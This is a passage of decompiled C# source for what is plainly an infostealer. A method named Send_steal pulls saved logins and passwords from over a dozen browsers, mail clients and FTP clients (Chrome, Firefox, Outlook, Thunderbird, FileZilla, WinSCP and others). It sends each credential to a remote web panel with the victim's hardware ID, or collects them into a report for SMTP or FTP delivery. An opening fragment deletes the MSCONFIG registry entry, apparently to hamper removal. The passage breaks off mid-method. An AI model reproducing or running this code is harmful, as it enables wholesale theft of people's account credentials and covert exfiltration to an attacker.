                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths", true);
                key.DeleteSubKey("MSCONFIG.EXE", true);
                key.Close();
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            ProjectData.ClearProjectError();
        }
    }

    public static void Send_steal()
    {
        string userName;
        string browser;
        string password;
        string uRL;
        DateTime now = DateTime.Now;
        string format = "MM/dd/yyyy HH:mm:ss";
        StringBuilder builder = new StringBuilder();
        try
        {
            object chromePasswords = BrowserRecovery.GetChromePasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(chromePasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator;
                try
                {
                    enumerator = ((IEnumerable) chromePasswords).GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        RecoveredBrowserAccount current = (RecoveredBrowserAccount) enumerator.Current;
                        browser = current.Browser;
                        uRL = current.URL;
                        userName = current.UserName;
                        password = current.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator is IDisposable)
                    {
                        (enumerator as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            ProjectData.ClearProjectError();
        }
        try
        {
            object firefoxPasswords = BrowserRecovery.GetFirefoxPasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(firefoxPasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator2;
                try
                {
                    enumerator2 = ((IEnumerable) firefoxPasswords).GetEnumerator();
                    while (enumerator2.MoveNext())
                    {
                        RecoveredBrowserAccount account2 = (RecoveredBrowserAccount) enumerator2.Current;
                        browser = account2.Browser;
                        uRL = account2.URL;
                        userName = account2.UserName;
                        password = account2.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator2 is IDisposable)
                    {
                        (enumerator2 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception32)
        {
            ProjectData.SetProjectError(exception32);
            Exception exception2 = exception32;
            ProjectData.ClearProjectError();
        }
        try
        {
            object operaPasswords = BrowserRecovery.GetOperaPasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(operaPasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator3;
                try
                {
                    enumerator3 = ((IEnumerable) operaPasswords).GetEnumerator();
                    while (enumerator3.MoveNext())
                    {
                        RecoveredBrowserAccount account3 = (RecoveredBrowserAccount) enumerator3.Current;
                        browser = account3.Browser;
                        uRL = account3.URL;
                        userName = account3.UserName;
                        password = account3.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator3 is IDisposable)
                    {
                        (enumerator3 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception33)
        {
            ProjectData.SetProjectError(exception33);
            Exception exception3 = exception33;
            ProjectData.ClearProjectError();
        }
        try
        {
            object yandexPasswords = BrowserRecovery.GetYandexPasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(yandexPasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator4;
                try
                {
                    enumerator4 = ((IEnumerable) yandexPasswords).GetEnumerator();
                    while (enumerator4.MoveNext())
                    {
                        RecoveredBrowserAccount account4 = (RecoveredBrowserAccount) enumerator4.Current;
                        browser = account4.Browser;
                        uRL = account4.URL;
                        userName = account4.UserName;
                        password = account4.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator4 is IDisposable)
                    {
                        (enumerator4 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception34)
        {
            ProjectData.SetProjectError(exception34);
            Exception exception4 = exception34;
            ProjectData.ClearProjectError();
        }
        try
        {
            List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>(BrowserRecovery.GetIExplorerPasswords());
            if (list.Count > 0)
            {
                List<RecoveredBrowserAccount>.Enumerator enumerator5;
                try
                {
                    enumerator5 = list.GetEnumerator();
                    while (enumerator5.MoveNext())
                    {
                        RecoveredBrowserAccount account5 = enumerator5.Current;
                        browser = account5.Browser;
                        uRL = account5.URL;
                        userName = account5.UserName;
                        password = account5.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    enumerator5.Dispose();
                }
            }
        }
        catch (Exception exception35)
        {
            ProjectData.SetProjectError(exception35);
            Exception exception5 = exception35;
            ProjectData.ClearProjectError();
        }
        try
        {
            object safariPasswords = BrowserRecovery.GetSafariPasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(safariPasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator6;
                try
                {
                    enumerator6 = ((IEnumerable) safariPasswords).GetEnumerator();
                    while (enumerator6.MoveNext())
                    {
                        RecoveredBrowserAccount account6 = (RecoveredBrowserAccount) enumerator6.Current;
                        browser = account6.Browser;
                        uRL = account6.URL;
                        userName = account6.UserName;
                        password = account6.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator6 is IDisposable)
                    {
                        (enumerator6 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception36)
        {
            ProjectData.SetProjectError(exception36);
            Exception exception6 = exception36;
            ProjectData.ClearProjectError();
        }
        try
        {
            object seaMonkeyPasswords = BrowserRecovery.GetSeaMonkeyPasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(seaMonkeyPasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator7;
                try
                {
                    enumerator7 = ((IEnumerable) seaMonkeyPasswords).GetEnumerator();
                    while (enumerator7.MoveNext())
                    {
                        RecoveredBrowserAccount account7 = (RecoveredBrowserAccount) enumerator7.Current;
                        browser = account7.Browser;
                        uRL = account7.URL;
                        userName = account7.UserName;
                        password = account7.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator7 is IDisposable)
                    {
                        (enumerator7 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception37)
        {
            ProjectData.SetProjectError(exception37);
            Exception exception7 = exception37;
            ProjectData.ClearProjectError();
        }
        try
        {
            object comodoPasswords = BrowserRecovery.GetComodoPasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(comodoPasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator8;
                try
                {
                    enumerator8 = ((IEnumerable) comodoPasswords).GetEnumerator();
                    while (enumerator8.MoveNext())
                    {
                        RecoveredBrowserAccount account8 = (RecoveredBrowserAccount) enumerator8.Current;
                        browser = account8.Browser;
                        uRL = account8.URL;
                        userName = account8.UserName;
                        password = account8.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator8 is IDisposable)
                    {
                        (enumerator8 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception38)
        {
            ProjectData.SetProjectError(exception38);
            Exception exception8 = exception38;
            ProjectData.ClearProjectError();
        }
        try
        {
            object instance = BrowserRecovery.Flock();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(instance, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator9;
                try
                {
                    enumerator9 = ((IEnumerable) instance).GetEnumerator();
                    while (enumerator9.MoveNext())
                    {
                        RecoveredBrowserAccount account9 = (RecoveredBrowserAccount) enumerator9.Current;
                        browser = account9.Browser;
                        uRL = account9.URL;
                        userName = account9.UserName.Replace("\n", "");
                        password = account9.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator9 is IDisposable)
                    {
                        (enumerator9 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception39)
        {
            ProjectData.SetProjectError(exception39);
            Exception exception9 = exception39;
            ProjectData.ClearProjectError();
        }
        try
        {
            object coolnovoPasswords = BrowserRecovery.GetCoolnovoPasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(coolnovoPasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator10;
                try
                {
                    enumerator10 = ((IEnumerable) coolnovoPasswords).GetEnumerator();
                    while (enumerator10.MoveNext())
                    {
                        RecoveredBrowserAccount account10 = (RecoveredBrowserAccount) enumerator10.Current;
                        browser = account10.Browser;
                        uRL = account10.URL;
                        userName = account10.UserName;
                        password = account10.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator10 is IDisposable)
                    {
                        (enumerator10 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception40)
        {
            ProjectData.SetProjectError(exception40);
            Exception exception10 = exception40;
            ProjectData.ClearProjectError();
        }
        try
        {
            object chromiumPasswords = BrowserRecovery.GetChromiumPasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(chromiumPasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator11;
                try
                {
                    enumerator11 = ((IEnumerable) chromiumPasswords).GetEnumerator();
                    while (enumerator11.MoveNext())
                    {
                        RecoveredBrowserAccount account11 = (RecoveredBrowserAccount) enumerator11.Current;
                        browser = account11.Browser;
                        uRL = account11.URL;
                        userName = account11.UserName;
                        password = account11.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator11 is IDisposable)
                    {
                        (enumerator11 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception41)
        {
            ProjectData.SetProjectError(exception41);
            Exception exception11 = exception41;
            ProjectData.ClearProjectError();
        }
        try
        {
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            list2 = BrowserRecovery.Outlook();
            if (list2.Count > 0)
            {
                List<RecoveredBrowserAccount>.Enumerator enumerator12;
                try
                {
                    enumerator12 = list2.GetEnumerator();
                    while (enumerator12.MoveNext())
                    {
                        RecoveredBrowserAccount account12 = enumerator12.Current;
                        browser = account12.Browser;
                        uRL = account12.URL;
                        userName = account12.UserName;
                        password = account12.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    enumerator12.Dispose();
                }
            }
        }
        catch (Exception exception42)
        {
            ProjectData.SetProjectError(exception42);
            Exception exception12 = exception42;
            ProjectData.ClearProjectError();
        }
        try
        {
            object obj12 = BrowserRecovery.Thunderbird();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj12, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator13;
                try
                {
                    enumerator13 = ((IEnumerable) obj12).GetEnumerator();
                    while (enumerator13.MoveNext())
                    {
                        RecoveredBrowserAccount account13 = (RecoveredBrowserAccount) enumerator13.Current;
                        browser = account13.Browser;
                        uRL = account13.URL;
                        userName = account13.UserName;
                        password = account13.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator13 is IDisposable)
                    {
                        (enumerator13 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception43)
        {
            ProjectData.SetProjectError(exception43);
            Exception exception13 = exception43;
            ProjectData.ClearProjectError();
        }
        try
        {
            List<RecoveredBrowserAccount> foxmailPasswords = BrowserRecovery.GetFoxmailPasswords();
            if (foxmailPasswords.Count > 0)
            {
                List<RecoveredBrowserAccount>.Enumerator enumerator14;
                try
                {
                    enumerator14 = foxmailPasswords.GetEnumerator();
                    while (enumerator14.MoveNext())
                    {
                        RecoveredBrowserAccount account14 = enumerator14.Current;
                        browser = account14.Browser;
                        uRL = account14.URL;
                        userName = account14.UserName;
                        password = account14.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    enumerator14.Dispose();
                }
            }
        }
        catch (Exception exception44)
        {
            ProjectData.SetProjectError(exception44);
            Interaction.MsgBox(exception44.ToString(), MsgBoxStyle.ApplicationModal, null);
            ProjectData.ClearProjectError();
        }
        try
        {
            object obj13 = BrowserRecovery.OperaMail();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj13, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator15;
                try
                {
                    enumerator15 = ((IEnumerable) obj13).GetEnumerator();
                    while (enumerator15.MoveNext())
                    {
                        RecoveredBrowserAccount account15 = (RecoveredBrowserAccount) enumerator15.Current;
                        browser = account15.Browser;
                        uRL = account15.URL;
                        userName = account15.UserName;
                        password = account15.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator15 is IDisposable)
                    {
                        (enumerator15 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception45)
        {
            ProjectData.SetProjectError(exception45);
            Exception exception15 = exception45;
            ProjectData.ClearProjectError();
        }
        try
        {
            object obj14 = BrowserRecovery.PocoMail();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj14, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator16;
                try
                {
                    enumerator16 = ((IEnumerable) obj14).GetEnumerator();
                    while (enumerator16.MoveNext())
                    {
                        RecoveredBrowserAccount account16 = (RecoveredBrowserAccount) enumerator16.Current;
                        browser = account16.Browser;
                        uRL = account16.URL;
                        userName = account16.UserName;
                        password = account16.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator16 is IDisposable)
                    {
                        (enumerator16 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception46)
        {
            ProjectData.SetProjectError(exception46);
            Exception exception16 = exception46;
            ProjectData.ClearProjectError();
        }
        try
        {
            if (BrowserRecovery.Eudora() != null)
            {
                RecoveredBrowserAccount account17 = BrowserRecovery.Eudora();
                browser = account17.Browser;
                uRL = account17.URL;
                userName = account17.UserName;
                password = account17.Password;
                if (LogType == "webpanel")
                {
                    postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                }
                else if ((LogType == "smtp") | (LogType == "ftp"))
                {
                    builder.AppendLine("<br>");
                    builder.AppendLine("URL:      " + uRL + "<br>");
                    builder.AppendLine("Username: " + userName + "<br>");
                    builder.AppendLine("Password: " + password + "<br>");
                    builder.AppendLine("Application: " + browser + "<br>");
                }
            }
        }
        catch (Exception exception47)
        {
            ProjectData.SetProjectError(exception47);
            Exception exception17 = exception47;
            ProjectData.ClearProjectError();
        }
        try
        {
            object obj15 = BrowserRecovery.TheBat();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj15, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator17;
                try
                {
                    enumerator17 = ((IEnumerable) obj15).GetEnumerator();
                    while (enumerator17.MoveNext())
                    {
                        RecoveredBrowserAccount account18 = (RecoveredBrowserAccount) enumerator17.Current;
                        browser = account18.Browser;
                        uRL = account18.URL;
                        userName = account18.UserName;
                        password = account18.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator17 is IDisposable)
                    {
                        (enumerator17 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception48)
        {
            ProjectData.SetProjectError(exception48);
            Exception exception18 = exception48;
            ProjectData.ClearProjectError();
        }
        try
        {
            if (BrowserRecovery.FileZilla().Count > 0)
            {
                List<RecoveredBrowserAccount>.Enumerator enumerator18;
                try
                {
                    enumerator18 = BrowserRecovery.FileZilla().GetEnumerator();
                    while (enumerator18.MoveNext())
                    {
                        RecoveredBrowserAccount account19 = enumerator18.Current;
                        browser = account19.Browser;
                        uRL = account19.URL;
                        userName = account19.UserName;
                        password = account19.Password;
                        if ((userName != "") & (password != ""))
                        {
                            if (LogType == "webpanel")
                            {
                                postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                            }
                            else if ((LogType == "smtp") | (LogType == "ftp"))
                            {
                                builder.AppendLine("<br>");
                                builder.AppendLine("URL:      " + uRL + "<br>");
                                builder.AppendLine("Username: " + userName + "<br>");
                                builder.AppendLine("Password: " + password + "<br>");
                                builder.AppendLine("Application: " + browser + "<br>");
                            }
                        }
                    }
                }
                finally
                {
                    enumerator18.Dispose();
                }
            }
        }
        catch (Exception exception49)
        {
            ProjectData.SetProjectError(exception49);
            Exception exception19 = exception49;
            ProjectData.ClearProjectError();
        }
        try
        {
            if (BrowserRecovery.WS_FTP().Count > 0)
            {
                List<RecoveredBrowserAccount>.Enumerator enumerator19;
                try
                {
                    enumerator19 = BrowserRecovery.WS_FTP().GetEnumerator();
                    while (enumerator19.MoveNext())
                    {
                        RecoveredBrowserAccount account20 = enumerator19.Current;
                        browser = account20.Browser;
                        uRL = account20.URL;
                        userName = account20.UserName;
                        password = account20.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    enumerator19.Dispose();
                }
            }
        }
        catch (Exception exception50)
        {
            ProjectData.SetProjectError(exception50);
            Exception exception20 = exception50;
            ProjectData.ClearProjectError();
        }
        try
        {
            object winSCPPasswords = BrowserRecovery.GetWinSCPPasswords();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(winSCPPasswords, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator20;
                try
                {
                    enumerator20 = ((IEnumerable) winSCPPasswords).GetEnumerator();
                    while (enumerator20.MoveNext())
                    {
                        RecoveredBrowserAccount account21 = (RecoveredBrowserAccount) enumerator20.Current;
                        browser = account21.Browser;
                        uRL = account21.URL;
                        userName = account21.UserName;
                        password = account21.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator20 is IDisposable)
                    {
                        (enumerator20 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception51)
        {
            ProjectData.SetProjectError(exception51);
            Exception exception21 = exception51;
            ProjectData.ClearProjectError();
        }
        try
        {
